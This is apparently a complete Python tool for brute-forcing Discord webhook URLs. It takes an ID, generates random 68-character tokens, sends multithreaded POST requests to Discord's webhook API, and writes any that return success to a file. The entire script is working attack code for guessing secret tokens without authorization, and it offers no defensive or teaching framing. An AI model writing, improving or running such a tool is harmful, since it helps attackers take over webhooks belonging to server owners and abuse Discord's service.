import random
import string
import requests
import threading
import os
import time
from colorama import Fore, Back, Style
from concurrent.futures import ThreadPoolExecutor

threadcount = int(input(Fore.LIGHTBLUE_EX + "How many threads would you like to use? // MAX 50: "))
threadcount = min(threadcount, 50)

tried_count = 0
valid_count = 0
invalid_count = 0
lock = threading.Lock()

serverid = int(input(Fore.LIGHTGREEN_EX + "Please Enter Server ID:"))

RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

def update_console_status():
    print(f"{GREEN}Valid: {valid_count} {RESET} {RED}Tried: {tried_count} {RESET} Invalid: {invalid_count}")

def generate_random_string(length=68):
    characters = string.ascii_letters + string.digits + "-_"
    return ''.join(random.choices(characters, k=length))

def check_webhook_validity(serverid, random_string):
    global tried_count, valid_count, invalid_count

    webhook_url = f"https://discord.com/api/v10/webhooks/{serverid}/{random_string}"
    
    with lock:
        tried_count += 1
        update_console_status()

    response = None
    while True:
        try:
            response = requests.post(webhook_url)
            break
        except requests.RequestException as e:
            print(Fore.MAGENTA + Back.RED + f"Request error: {e}")
            return
        
    if response.status_code == 204:
        with lock:
            valid_count += 1
            update_console_status()
            print(Fore.GREEN + f"{webhook_url}")  
        return webhook_url
    elif response.status_code == 429:
        time.sleep(5)  
    else:
        with lock:
            invalid_count += 1
            update_console_status()
        print(Fore.RED + f"{webhook_url}") 

def start_thread_for_webhook_validation(howmuch):
    valid_webhooks = []
    with ThreadPoolExecutor(max_workers=threadcount) as executor:
        futures = [executor.submit(check_webhook_validity, serverid, generate_random_string(68)) for _ in range(howmuch)]
        for future in futures:
            result = future.result()
            if result:
                valid_webhooks.append(result)

    if valid_webhooks:
        with open("valid.txt", "a") as f:
            f.write("\n".join(valid_webhooks) + "\n")

def main():
    while True:
        try:
            howmuch = int(input(Fore.BLUE + "How many webhooks would you like to check? "))
        except ValueError:
            print(Fore.RED + "You entered an invalid number. Please try again.")
            continue

        start_thread_for_webhook_validation(howmuch)
        
        again = input(Back.RESET + Fore.CYAN + "Would you like to check another webhook? (Yes/No): ").strip().lower()
        
        if again != 'yes':
            print("The program is terminating...")
            break

main()
